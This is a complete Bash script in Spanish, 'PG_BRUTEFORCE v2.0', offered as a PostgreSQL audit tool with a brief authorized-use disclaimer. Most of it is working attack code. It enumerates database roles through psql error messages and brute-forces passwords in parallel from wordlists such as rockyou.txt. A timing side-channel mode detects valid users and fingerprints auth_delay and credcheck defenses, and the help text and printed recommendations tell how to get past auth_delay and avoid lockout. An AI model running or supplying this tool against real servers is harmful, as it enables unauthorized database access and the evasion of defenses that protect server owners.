#!/bin/bash
# =============================================================================
#  PG_BRUTEFORCE v2.0 - Herramienta de Auditoría Profesional PostgreSQL
#  Autor: Tu nombre aquí
#  Uso: Solo en sistemas con autorización explícita del propietario.
# =============================================================================

# --- Colores ---
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

VERSION="2.0"

# --- Valores por defecto ---
HOST="127.0.0.1"
PORT="5432"
DB="postgres"
USER_DEFAULT="postgres"
PASS_DEFAULT="check_user_123"
USER_FILE=""
PASS_FILE=""
SKIP_PORT_CHECK=false
QUIET_MODE=false
OUTPUT_FILE=""
EXIT_ON_SUCCESS=false
CLI_TIMEOUT=5
WORKERS=1
ANALYZE_MODE=false
TIMING_SAMPLES=3
TIMING_THRESHOLD="0.3"

# --- Directorio temporal (limpiado automáticamente al salir) ---
TEMP_DIR=$(mktemp -d /tmp/pg_bf_XXXXXX)
LOCK_FILE="$TEMP_DIR/output.lock"
OUT_LOCK="$TEMP_DIR/outfile.lock"
SUCCESS_FLAG="$TEMP_DIR/success.flag"

# --- Limpieza al salir ---
cleanup() {
    jobs -p 2>/dev/null | xargs -r kill 2>/dev/null
    wait 2>/dev/null
    rm -rf "$TEMP_DIR" 2>/dev/null
}
trap cleanup EXIT INT TERM

# =============================================================================
# FUNCIONES UTILITARIAS
# =============================================================================

mostrar_banner() {
    echo -e "${CYAN}"
    echo "  ██████   ██████     ██████  ██████  ██    ██ ████████ ███████"
    echo "  ██   ██ ██         ██   ██ ██   ██ ██    ██    ██    ██     "
    echo "  ██████  ██   ███   ██████  ██████  ██    ██    ██    █████  "
    echo "  ██      ██    ██   ██   ██ ██   ██ ██    ██    ██    ██     "
    echo "  ██       ██████    ██████  ██   ██  ██████     ██    ███████"
    echo -e "${WHITE}             v${VERSION} — Auditoría Profesional PostgreSQL${NC}"
    echo -e "${RED}  [!] Solo para uso ético y con autorización explícita del propietario.${NC}"
    echo ""
}

mostrar_ayuda() {
    mostrar_banner
    echo -e "${WHITE}${BOLD}USO:${NC}  $0 [opciones]\n"

    echo -e "${CYAN}${BOLD}CONEXIÓN:${NC}"
    printf "  %-18s %s\n" "-h <host>"   "Host del servidor PostgreSQL.        [Default: 127.0.0.1]"
    printf "  %-18s %s\n" "-p <port>"   "Puerto del servidor.                 [Default: 5432]"
    printf "  %-18s %s\n" "-d <db>"     "Base de datos objetivo.              [Default: postgres]"

    echo -e "\n${CYAN}${BOLD}ATAQUE:${NC}"
    printf "  %-18s %s\n" "-u <file>"   "Archivo con lista de usuarios (modo enumeración)."
    printf "  %-18s %s\n" "-f <file>"   "Archivo con lista de contraseñas (modo fuerza bruta)."
    printf "  %-18s %s\n" "-U <user>"   "Usuario específico para ataque de passwords.   [Default: postgres]"
    printf "  %-18s %s\n" "-P <pass>"   "Contraseña base para enumeración de usuarios."

    echo -e "\n${CYAN}${BOLD}RENDIMIENTO Y PARALELISMO:${NC}"
    printf "  %-18s %s\n" "-w <num>"    "Número de workers paralelos.         [Default: 1]"
    printf "  %-18s %s\n" "-T <seg>"    "Timeout máximo por intento (seg).    [Default: 5]"
    printf "              " 
    echo "  → Usar -T bajo para bypassear auth_delay (ej: -T 0.5)"

    echo -e "\n${CYAN}${BOLD}ANÁLISIS DE TIMING (Técnica de los Tres Tiempos):${NC}"
    printf "  %-18s %s\n" "-A"          "Modo Análisis: detecta usuarios válidos por diferencia de"
    printf "  %-18s %s\n" ""            "tiempo de respuesta sin necesidad de contraseña."
    printf "  %-18s %s\n" "-n <num>"    "Muestras para promediar tiempos.     [Default: 3]"
    printf "  %-18s %s\n" "-D <seg>"    "Umbral de detección de delay.        [Default: 0.3s]"
    printf "  %-18s %s\n" ""            "  Combinar con -u para analizar una lista de usuarios."
    printf "  %-18s %s\n" ""            "  Combinar con -U para definir el usuario objetivo del test."

    echo -e "\n${CYAN}${BOLD}EXTRAS:${NC}"
    printf "  %-18s %s\n" "-S"          "Saltar validación de puerto TCP."
    printf "  %-18s %s\n" "-q"          "Modo silencioso: solo muestra hallazgos [->]."
    printf "  %-18s %s\n" "-x"          "Finalizar al primer acierto encontrado."
    printf "  %-18s %s\n" "-o <file>"   "Guardar resultados con timestamps en un archivo."
    printf "  %-18s %s\n" "-H"          "Mostrar este menú de ayuda."

    echo -e "\n${CYAN}${BOLD}EJEMPLOS:${NC}"
    echo -e "  ${DIM}# Test de timing sin conocer nada del servidor:${NC}"
    echo    "  $0 -h 10.0.0.1 -A"
    echo ""
    echo -e "  ${DIM}# Análisis de timing sobre lista de usuarios:${NC}"
    echo    "  $0 -h 10.0.0.1 -A -u users.txt -D 0.3 -n 5"
    echo ""
    echo -e "  ${DIM}# Enumeración paralela de usuarios (8 workers, timeout 2s):${NC}"
    echo    "  $0 -h 10.0.0.1 -u users.txt -w 8 -T 2"
    echo ""
    echo -e "  ${DIM}# Fuerza bruta de contraseñas, salir al primer éxito, guardar log:${NC}"
    echo    "  $0 -h 10.0.0.1 -U postgres -f rockyou.txt -w 4 -T 3 -x -o resultado.log"
    echo ""
    echo -e "  ${DIM}# Bypass de auth_delay con timeout ultra-bajo (usuarios que no existen → rápido):${NC}"
    echo    "  $0 -h 10.0.0.1 -u users.txt -T 0.5 -w 10 -q -o validos.log"
    echo ""
    exit 0
}

# =============================================================================
# PROCESAMIENTO DE ARGUMENTOS
# =============================================================================

while getopts "h:p:d:U:P:u:f:So:qxHT:w:An:D:" opt; do
    case $opt in
        h) HOST=$OPTARG ;;
        p) PORT=$OPTARG ;;
        d) DB=$OPTARG ;;
        U) USER_DEFAULT=$OPTARG ;;
        P) PASS_DEFAULT=$OPTARG ;;
        u) USER_FILE=$OPTARG ;;
        f) PASS_FILE=$OPTARG ;;
        S) SKIP_PORT_CHECK=true ;;
        q) QUIET_MODE=true ;;
        x) EXIT_ON_SUCCESS=true ;;
        o) OUTPUT_FILE=$OPTARG ;;
        T) CLI_TIMEOUT=$OPTARG ;;
        w) WORKERS=$OPTARG ;;
        A) ANALYZE_MODE=true ;;
        n) TIMING_SAMPLES=$OPTARG ;;
        D) TIMING_THRESHOLD=$OPTARG ;;
        H) mostrar_ayuda ;;
        *) mostrar_ayuda ;;
    esac
done

# =============================================================================
# FUNCIÓN DE LOGGING (thread-safe con flock)
# =============================================================================

log_msg() {
    local TIPO="$1"
    local MSG="$2"
    local COLOR="$3"
    local PREFIJO="$4"
    local TIEMPO="$5"
    local STR_TIEMPO=""

    [[ -n "$TIEMPO" ]] && STR_TIEMPO=" [${TIEMPO}s]"

    if [ "$QUIET_MODE" = false ] || [ "$TIPO" = "SUCCESS" ]; then
        (
            flock -x 200
            echo -e "${COLOR}${PREFIJO}${STR_TIEMPO} ${MSG}${NC}"
        ) 200>"$LOCK_FILE"
    fi

    if [[ -n "$OUTPUT_FILE" ]]; then
        (
            flock -x 201
            echo "[$(date +'%Y-%m-%d %H:%M:%S')] [$TIPO]${STR_TIEMPO} $MSG" >> "$OUTPUT_FILE"
        ) 201>"$OUT_LOCK"
    fi
}

# =============================================================================
# VALIDACIÓN DE DEPENDENCIAS Y PUERTO
# =============================================================================

verificar_dependencias() {
    local missing=()
    for cmd in psql bc timeout; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[ERROR] Dependencias faltantes: ${missing[*]}${NC}"
        echo -e "${YELLOW}  Instalar: sudo apt install postgresql-client bc coreutils${NC}"
        exit 1
    fi
}

validar_puerto() {
    [ "$QUIET_MODE" = false ] && echo -ne "${CYAN}[*] Validando alcance a $HOST:$PORT ... ${NC}"
    if ! timeout 3s bash -c "echo > /dev/tcp/$HOST/$PORT" 2>/dev/null; then
        echo ""
        log_msg "ERROR" "No hay alcance al puerto $PORT en $HOST. Verifica host/puerto." "$RED" "[X]"
        exit 1
    fi
    [ "$QUIET_MODE" = false ] && echo -e "${GREEN}OK${NC}"
}

# =============================================================================
# FUNCIÓN DE MEDICIÓN DE TIEMPO (para modo análisis)
# =============================================================================

# Devuelve el tiempo promedio en segundos con 4 decimales
medir_tiempo_respuesta() {
    local username="$1"
    local password="$2"
    local samples="${3:-$TIMING_SAMPLES}"
    local total="0"

    for ((i=0; i<samples; i++)); do
        local t_start t_end elapsed
        t_start=$(date +%s%N)
        PGPASSWORD="$password" timeout "${CLI_TIMEOUT}s" psql \
            -h "$HOST" -p "$PORT" -d "$DB" -U "$username" \
            -c "SELECT 1" >/dev/null 2>&1
        t_end=$(date +%s%N)
        elapsed=$(echo "scale=6; ($t_end - $t_start) / 1000000000" | bc)
        total=$(echo "scale=6; $total + $elapsed" | bc)
    done

    echo "scale=4; $total / $samples" | bc
}

medir_tcp() {
    local samples="${1:-$TIMING_SAMPLES}"
    local total="0"
    for ((i=0; i<samples; i++)); do
        local t_start t_end elapsed
        t_start=$(date +%s%N)
        timeout 3s bash -c "echo > /dev/tcp/$HOST/$PORT" 2>/dev/null
        t_end=$(date +%s%N)
        elapsed=$(echo "scale=6; ($t_end - $t_start) / 1000000000" | bc)
        total=$(echo "scale=6; $total + $elapsed" | bc)
    done
    echo "scale=4; $total / $samples" | bc
}

# Compara dos tiempos. Retorna 1 si diff > threshold.
es_significativo() {
    local t1="$1"
    local t2="$2"
    local threshold="$3"
    local diff
    diff=$(echo "scale=4; $t2 - $t1" | bc)
    # Retorna 0 (true en bash) si la diferencia supera el umbral
    (echo "$diff > $threshold" | bc -l | grep -q "^1$")
}

# =============================================================================
# MODO ANÁLISIS — TÉCNICA DE LOS TRES TIEMPOS
# =============================================================================

modo_analisis() {
    local FAKE_USER
    local FAKE_PASS
    FAKE_USER="usr_probe_$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8 2>/dev/null || echo 'rnd12345')"
    FAKE_PASS="Pr0b3_$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 10 2>/dev/null || echo 'rndpass')"

    echo -e "\n${CYAN}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║        ANÁLISIS DE TIMING — TÉCNICA TRES TIEMPOS         ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}\n"

    echo -e "  ${WHITE}Servidor:           ${CYAN}$HOST:$PORT${NC}"
    echo -e "  ${WHITE}Base de datos:      ${CYAN}$DB${NC}"
    echo -e "  ${WHITE}Usuario objetivo:   ${CYAN}$USER_DEFAULT${NC}"
    echo -e "  ${WHITE}Muestras/medición:  ${CYAN}$TIMING_SAMPLES${NC}"
    echo -e "  ${WHITE}Umbral de delay:    ${CYAN}${TIMING_THRESHOLD}s${NC}"
    echo -e "  ${WHITE}Timeout:            ${CYAN}${CLI_TIMEOUT}s${NC}\n"

    # ── TIEMPO 1: Baseline TCP ──────────────────────────────────────────────
    echo -e "${CYAN}${BOLD}[PASO 1/3]${NC} Midiendo latencia TCP (baseline de red)..."
    local T_TCP
    T_TCP=$(medir_tcp "$TIMING_SAMPLES")
    echo -e "  ${GREEN}↳ Tiempo TCP promedio: ${WHITE}${T_TCP}s${NC}\n"

    # ── TIEMPO 2: Usuario INEXISTENTE ───────────────────────────────────────
    echo -e "${CYAN}${BOLD}[PASO 2/3]${NC} Midiendo respuesta con usuario INEXISTENTE (${FAKE_USER})..."
    local T_FAKE
    T_FAKE=$(medir_tiempo_respuesta "$FAKE_USER" "$FAKE_PASS")
    echo -e "  ${GREEN}↳ Tiempo promedio: ${WHITE}${T_FAKE}s${NC}\n"

    # ── TIEMPO 3: Usuario OBJETIVO ──────────────────────────────────────────
    echo -e "${CYAN}${BOLD}[PASO 3/3]${NC} Midiendo respuesta con usuario OBJETIVO (${USER_DEFAULT})..."
    local T_TARGET
    T_TARGET=$(medir_tiempo_respuesta "$USER_DEFAULT" "$FAKE_PASS")
    echo -e "  ${GREEN}↳ Tiempo promedio: ${WHITE}${T_TARGET}s${NC}\n"

    # ── Calcular diferencia ─────────────────────────────────────────────────
    local DIFF
    DIFF=$(echo "scale=4; $T_TARGET - $T_FAKE" | bc)

    echo -e "${WHITE}${BOLD}─────────────────── RESUMEN DE MEDICIONES ─────────────────────${NC}"
    printf "  %-35s ${CYAN}%s${NC}\n" "Tiempo TCP (red baseline):"      "${T_TCP}s"
    printf "  %-35s ${CYAN}%s${NC}\n" "Tiempo usuario inexistente:"      "${T_FAKE}s"
    printf "  %-35s ${CYAN}%s${NC}\n" "Tiempo usuario objetivo ($USER_DEFAULT):" "${T_TARGET}s"
    printf "  %-35s ${YELLOW}%s${NC}\n" "Diferencia (objetivo - inexistente):" "${DIFF}s"
    printf "  %-35s ${YELLOW}%s${NC}\n" "Umbral configurado:" "${TIMING_THRESHOLD}s"
    echo ""

    # ── Interpretación ──────────────────────────────────────────────────────
    local DIFF_SIG FAKE_HIGH TARGET_HIGH
    DIFF_SIG=$(echo "$DIFF > $TIMING_THRESHOLD" | bc -l)
    FAKE_HIGH=$(echo "$T_FAKE > 0.5" | bc -l)
    TARGET_HIGH=$(echo "$T_TARGET > 0.5" | bc -l)

    if [ "$DIFF_SIG" = "1" ]; then
        # El objetivo tarda MÁS → delay selectivo → usuario existe
        echo -e "${GREEN}${BOLD}[✔] DELAY SELECTIVO DETECTADO${NC}"
        echo -e "${GREEN}    El usuario '${USER_DEFAULT}' probablemente EXISTE en el servidor.${NC}"
        echo -e "${GREEN}    El servidor aplica auth_delay SOLO cuando el usuario es válido.${NC}"

        # Test de penalización progresiva (credcheck)
        echo -e "\n${CYAN}[*] Comprobando penalización progresiva (credcheck)...${NC}"
        local T_TARGET2
        T_TARGET2=$(medir_tiempo_respuesta "$USER_DEFAULT" "${FAKE_PASS}2" 1)
        local INCR
        INCR=$(echo "scale=4; $T_TARGET2 - $T_TARGET" | bc)
        local IS_GROWING
        IS_GROWING=$(echo "$INCR > 0.8" | bc -l)

        if [ "$IS_GROWING" = "1" ]; then
            echo -e "${RED}${BOLD}[!!] DEFENSA ACTIVA DETECTADA — PENALIZACIÓN PROGRESIVA${NC}"
            echo -e "${RED}    Intento 1: ${T_TARGET}s → Intento 2: ${T_TARGET2}s (Δ${INCR}s)${NC}"
            echo -e "${RED}    Existe una extensión tipo credcheck/auth_delay acumulativo.${NC}"
            echo -e "${RED}    RIESGO DE LOCKOUT: Usa -T bajo y -w 1.${NC}"
        else
            echo -e "${GREEN}    No se detectó penalización progresiva. Sin riesgo de lockout inmediato.${NC}"
        fi

        # Calcular timeout sugerido
        local SUGGESTED_T
        SUGGESTED_T=$(echo "scale=1; $T_FAKE + 0.5" | bc)
        echo -e "\n${YELLOW}${BOLD}[RECOMENDACIÓN]:${NC}"
        echo -e "  Usa: ${CYAN}$0 -h $HOST -p $PORT -U $USER_DEFAULT -f <wordlist> -T $SUGGESTED_T -w 4${NC}"
        echo -e "  Bypass delay: ${CYAN}$0 -h $HOST -p $PORT -u <users.txt> -T $SUGGESTED_T -w 8${NC}"

    elif [ "$FAKE_HIGH" = "1" ] && [ "$TARGET_HIGH" = "1" ]; then
        # Ambos lentos → delay global
        echo -e "${YELLOW}${BOLD}[!] DELAY GLOBAL DETECTADO${NC}"
        echo -e "${YELLOW}    El servidor aplica delay a TODOS los intentos fallidos.${NC}"
        echo -e "${YELLOW}    No es posible enumerar usuarios por diferencia de timing.${NC}"
        local SUGGESTED_T2
        SUGGESTED_T2=$(echo "scale=1; $T_TARGET + 1.0" | bc)
        echo -e "\n${YELLOW}${BOLD}[RECOMENDACIÓN]:${NC}"
        echo -e "  Ajusta timeout: ${CYAN}$0 -h $HOST -p $PORT -U $USER_DEFAULT -f <wordlist> -T $SUGGESTED_T2${NC}"

    else
        # Ambos rápidos → sin delay
        echo -e "${GREEN}${BOLD}[✔] SIN DELAY DETECTADO — SERVIDOR RÁPIDO${NC}"
        echo -e "${GREEN}    El servidor no aplica throttling. Blanco ideal para ataque directo.${NC}"
        local NEG_DIFF
        NEG_DIFF=$(echo "$DIFF < 0" | bc -l)
        if [ "$NEG_DIFF" = "1" ]; then
            echo -e "${YELLOW}    Nota: El objetivo respondió ANTES que el usuario ficticio.${NC}"
            echo -e "${YELLOW}    Esto puede indicar varianza de red. Prueba con más muestras: -n 10${NC}"
        fi
        echo -e "\n${YELLOW}${BOLD}[RECOMENDACIÓN]:${NC}"
        echo -e "  ${CYAN}$0 -h $HOST -p $PORT -u <users.txt> -w 8 -T 2${NC}"
        echo -e "  ${CYAN}$0 -h $HOST -p $PORT -U $USER_DEFAULT -f <wordlist> -w 8 -T 2${NC}"
    fi

    # ── Si se proporcionó lista de usuarios, analizar todos ─────────────────
    if [[ -n "$USER_FILE" ]] && [[ -f "$USER_FILE" ]]; then
        echo -e "\n${CYAN}${BOLD}═══════════════ ANÁLISIS DE LISTA DE USUARIOS ═══════════════${NC}"
        echo -e "${WHITE}[*] Referencia (usuario inexistente): ${CYAN}${T_FAKE}s${NC}"
        echo -e "${WHITE}[*] Umbral de detección: ${CYAN}${TIMING_THRESHOLD}s${NC}"
        echo -e "${WHITE}[*] Procesando: ${CYAN}$USER_FILE${NC}\n"

        local count_valid=0 count_total=0
        while IFS= read -r username; do
            [[ -z "$username" || "$username" =~ ^# ]] && continue
            count_total=$((count_total + 1))

            local T_USR
            T_USR=$(medir_tiempo_respuesta "$username" "$FAKE_PASS" 1)
            local DIFF_USR
            DIFF_USR=$(echo "scale=4; $T_USR - $T_FAKE" | bc)
            local SIG
            SIG=$(echo "$DIFF_USR > $TIMING_THRESHOLD" | bc -l 2>/dev/null)

            if [ "$SIG" = "1" ]; then
                count_valid=$((count_valid + 1))
                echo -e "${GREEN}[->] POSIBLE USUARIO VÁLIDO: '${username}' (${T_USR}s vs ref ${T_FAKE}s, Δ${DIFF_USR}s)${NC}"
                [[ -n "$OUTPUT_FILE" ]] && {
                    flock -x 201
                    echo "[$(date +'%Y-%m-%d %H:%M:%S')] [TIMING-VALID] Usuario: '$username' T=${T_USR}s Delta=${DIFF_USR}s" >> "$OUTPUT_FILE"
                    flock -u 201
                } 2>/dev/null
            else
                [ "$QUIET_MODE" = false ] && \
                    echo -e "${RED}[X]  '${username}' (${T_USR}s, Δ${DIFF_USR}s)${NC}"
            fi
        done < "$USER_FILE"

        echo -e "\n${WHITE}${BOLD}[RESUMEN] Usuarios analizados: ${count_total} | Posibles válidos: ${count_valid}${NC}"
    fi

    echo -e "\n${CYAN}${BOLD}════════════════════ FIN DEL ANÁLISIS ════════════════════${NC}\n"

    # Log del análisis
    [[ -n "$OUTPUT_FILE" ]] && \
        echo "[$(date +'%Y-%m-%d %H:%M:%S')] [ANALYZE] Host=$HOST:$PORT T_TCP=${T_TCP}s T_FAKE=${T_FAKE}s T_TARGET=${T_TARGET}s DIFF=${DIFF}s" >> "$OUTPUT_FILE"
}

# =============================================================================
# WORKERS DE ATAQUE
# =============================================================================

# ─── Worker: Enumeración de usuarios ────────────────────────────────────────
worker_usuarios() {
    local worker_id="$1"
    local total_workers="$2"

    # Cada worker procesa su subconjunto de líneas usando awk (distribución modular)
    awk -v w="$worker_id" -v n="$total_workers" \
        'NR % n == w % n && length($0) > 0 && !/^#/' "$USER_FILE" | \
    while IFS= read -r username; do
        # Salida anticipada si ya se encontró éxito
        [ -f "$SUCCESS_FLAG" ] && return 0

        local t_start t_end duration RES status
        t_start=$(date +%s%N)
        RES=$(PGPASSWORD="$PASS_DEFAULT" timeout "${CLI_TIMEOUT}s" psql \
            -h "$HOST" -p "$PORT" -d "$DB" -U "$username" \
            -c "SELECT 1" 2>&1)
        status=$?
        t_end=$(date +%s%N)
        duration=$(echo "scale=3; ($t_end - $t_start) / 1000000000" | bc)

        [ -f "$SUCCESS_FLAG" ] && return 0

        if [ "$status" -eq 124 ]; then
            # Timeout → posible usuario válido con auth_delay (bypass técnica)
            log_msg "TIMEOUT" "Timeout (>${CLI_TIMEOUT}s) → Posible usuario válido: '${username}'" \
                "$YELLOW" "[!]" "$duration"
        elif [[ "$RES" == *"password authentication failed"* ]]; then
            log_msg "SUCCESS" "Usuario VÁLIDO: '${username}' (requiere contraseña)" \
                "$GREEN" "[->]" "$duration"
            touch "$SUCCESS_FLAG"
            [ "$EXIT_ON_SUCCESS" = true ] && return 0
        elif [[ "$RES" == *"SELECT 1"* ]]; then
            log_msg "SUCCESS" "¡ACCESO DIRECTO! Usuario '${username}' sin contraseña" \
                "$YELLOW" "[->]" "$duration"
            touch "$SUCCESS_FLAG"
            [ "$EXIT_ON_SUCCESS" = true ] && return 0
        elif [[ "$RES" == *"database \"$DB\" does not exist"* ]]; then
            log_msg "SUCCESS" "Usuario VÁLIDO: '${username}' (DB '$DB' no existe, pero el rol sí)" \
                "$YELLOW" "[->]" "$duration"
            touch "$SUCCESS_FLAG"
            [ "$EXIT_ON_SUCCESS" = true ] && return 0
        elif [[ "$RES" == *"no pg_hba.conf entry"* ]]; then
            log_msg "DENIED" "Usuario '${username}' denegado por pg_hba.conf" \
                "$RED" "[X]" "$duration"
        elif [[ "$RES" == *"role \"$username\" does not exist"* ]]; then
            log_msg "INFO" "Usuario '${username}' no existe." \
                "$RED" "[X]" "$duration"
        elif [[ "$RES" == *"Connection refused"* ]] || [[ "$RES" == *"could not connect"* ]]; then
            log_msg "ERROR" "Error de conexión para '${username}': $RES" \
                "$RED" "[!!]" "$duration"
        else
            log_msg "UNKNOWN" "Respuesta inesperada para '${username}': $(echo "$RES" | head -1)" \
                "$YELLOW" "[?]" "$duration"
        fi
    done
}

# ─── Worker: Fuerza bruta de contraseñas ─────────────────────────────────────
worker_passwords() {
    local worker_id="$1"
    local total_workers="$2"

    awk -v w="$worker_id" -v n="$total_workers" \
        'NR % n == w % n && length($0) > 0 && !/^#/' "$PASS_FILE" | \
    while IFS= read -r password; do
        [ -f "$SUCCESS_FLAG" ] && return 0

        local t_start t_end duration RES status
        t_start=$(date +%s%N)
        RES=$(PGPASSWORD="$password" timeout "${CLI_TIMEOUT}s" psql \
            -h "$HOST" -p "$PORT" -d "$DB" -U "$USER_DEFAULT" \
            -c "SELECT 1" 2>&1)
        status=$?
        t_end=$(date +%s%N)
        duration=$(echo "scale=3; ($t_end - $t_start) / 1000000000" | bc)

        [ -f "$SUCCESS_FLAG" ] && return 0

        if [ "$status" -eq 124 ]; then
            log_msg "TIMEOUT" "Timeout (>${CLI_TIMEOUT}s) con pass: '${password}'" \
                "$YELLOW" "[!]" "$duration"
        elif [ "$status" -eq 0 ]; then
            log_msg "SUCCESS" "¡CONTRASEÑA ENCONTRADA! → ${USER_DEFAULT}:${password}" \
                "$GREEN" "[->]" "$duration"
            touch "$SUCCESS_FLAG"
            return 0
        elif [[ "$RES" == *"database \"$DB\" does not exist"* ]]; then
            log_msg "SUCCESS" "Contraseña válida: '${password}' (DB '$DB' no existe, pero auth pasó)" \
                "$YELLOW" "[->]" "$duration"
            touch "$SUCCESS_FLAG"
            return 0
        else
            log_msg "FAIL" "Fallido: ${password}" \
                "$RED" "[X]" "$duration"
        fi
    done
}

# =============================================================================
# LANZADOR DE WORKERS PARALELOS
# =============================================================================

lanzar_workers() {
    local mode="$1"  # "users" | "passwords"
    local input_file total_lines
    [ "$mode" = "users" ] && input_file="$USER_FILE" || input_file="$PASS_FILE"
    total_lines=$(grep -c -v '^#\|^[[:space:]]*$' "$input_file" 2>/dev/null || wc -l < "$input_file")

    # Ajustar workers si la lista es pequeña
    local effective_workers=$WORKERS
    if [ "$total_lines" -lt "$WORKERS" ]; then
        effective_workers=$total_lines
        [ "$QUIET_MODE" = false ] && \
            echo -e "${YELLOW}[*] Lista pequeña ($total_lines entradas). Ajustando workers a: $effective_workers${NC}"
    fi

    [ "$QUIET_MODE" = false ] && {
        local attack_label
        [ "$mode" = "users" ] && attack_label="Enumeración de usuarios" || attack_label="Fuerza bruta → ${USER_DEFAULT}"
        echo -e "${CYAN}[!] ${attack_label}${NC}"
        echo -e "${CYAN}    Lista: ${WHITE}${input_file}${CYAN} | Entradas: ${WHITE}${total_lines}${CYAN} | Workers: ${WHITE}${effective_workers}${CYAN} | Timeout: ${WHITE}${CLI_TIMEOUT}s${NC}"
        echo -e "${DIM}─────────────────────────────────────────────────────${NC}"
    }

    local pids=()
    for ((i = 0; i < effective_workers; i++)); do
        if [ "$mode" = "users" ]; then
            worker_usuarios "$i" "$effective_workers" &
        else
            worker_passwords "$i" "$effective_workers" &
        fi
        pids+=($!)
    done

    # Esperar todos los workers
    for pid in "${pids[@]}"; do
        wait "$pid" 2>/dev/null
    done

    if [ -f "$SUCCESS_FLAG" ] && [ "$EXIT_ON_SUCCESS" = true ]; then
        [ "$QUIET_MODE" = false ] && \
            echo -e "\n${GREEN}[*] Objetivo alcanzado. Workers finalizados.${NC}"
    fi
}

# =============================================================================
# MAIN
# =============================================================================

[ "$QUIET_MODE" = false ] && mostrar_banner
verificar_dependencias

# Validar puerto
[ "$SKIP_PORT_CHECK" = false ] && validar_puerto

# Inicializar archivo de salida
if [[ -n "$OUTPUT_FILE" ]]; then
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] [START] PG_BRUTEFORCE v${VERSION} | Host: $HOST:$PORT | DB: $DB | Workers: $WORKERS | Timeout: ${CLI_TIMEOUT}s" >> "$OUTPUT_FILE"
fi

# ─── Modo Análisis de Timing ────────────────────────────────────────────────
if [ "$ANALYZE_MODE" = true ]; then
    modo_analisis
    exit 0
fi

# ─── Modo Enumeración de Usuarios ───────────────────────────────────────────
if [[ -n "$USER_FILE" ]]; then
    if [[ ! -f "$USER_FILE" ]]; then
        echo -e "${RED}[ERROR] Archivo de usuarios no encontrado: $USER_FILE${NC}"
        exit 1
    fi
    lanzar_workers "users"
    [ "$QUIET_MODE" = false ] && echo -e "\n${CYAN}[*] Enumeración completada.${NC}"

# ─── Modo Fuerza Bruta de Contraseñas ───────────────────────────────────────
elif [[ -n "$PASS_FILE" ]]; then
    if [[ ! -f "$PASS_FILE" ]]; then
        echo -e "${RED}[ERROR] Archivo de contraseñas no encontrado: $PASS_FILE${NC}"
        exit 1
    fi
    lanzar_workers "passwords"
    [ "$QUIET_MODE" = false ] && echo -e "\n${CYAN}[*] Fuerza bruta completada.${NC}"

# ─── Sin modo especificado → mostrar ayuda ───────────────────────────────────
else
    mostrar_ayuda
fi

# Cierre del log
if [[ -n "$OUTPUT_FILE" ]]; then
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] [END] Proceso finalizado." >> "$OUTPUT_FILE"
fi
